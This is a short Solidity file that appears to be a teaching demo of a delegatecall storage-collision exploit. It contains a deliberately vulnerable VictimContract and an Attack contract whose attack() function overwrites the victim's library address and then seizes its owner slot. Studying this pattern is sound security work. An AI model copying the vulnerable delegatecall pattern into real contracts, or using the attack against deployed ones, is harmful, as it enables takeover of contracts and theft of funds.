//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    uint256 public favouriteNumber; //stored in slot 0

    function setFavouriteNumber(uint256 _num) public {
        favouriteNumber = _num;
    }
}

contract VictimContract {
    address public lib; // stored in slot 0
    address public owner; // stored in slot 1
    uint256 public favouriteNumber; //stored in slot 2

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function setFavouriteNumber(uint256 _num) public {
        lib.delegatecall(
            abi.encodeWithSignature("setFavouriteNumber(uint256)", _num)
        );
        //lib.call(abi.encodeWithSignature("setFavouriteNumber", _num));
    }
}

contract Attack {
    //the storage layout must be the same as VictimContract
    address public lib; //stored in slot 0
    address public owner; //stored in slot 1
    uint256 public favouriteNumber; //stored in slot 2

    VictimContract public targetContract; //stored in slot 3 => does not interfere with slots 0,1,2

    constructor(VictimContract _targetContract) {
        targetContract = VictimContract(_targetContract);
    }

    function attack() public {
        targetContract.setFavouriteNumber(uint256(uint160(address(this))));
        targetContract.setFavouriteNumber(1);
    }

    function setFavouriteNumber(uint256 _num) public {
        owner = msg.sender;
    }
}
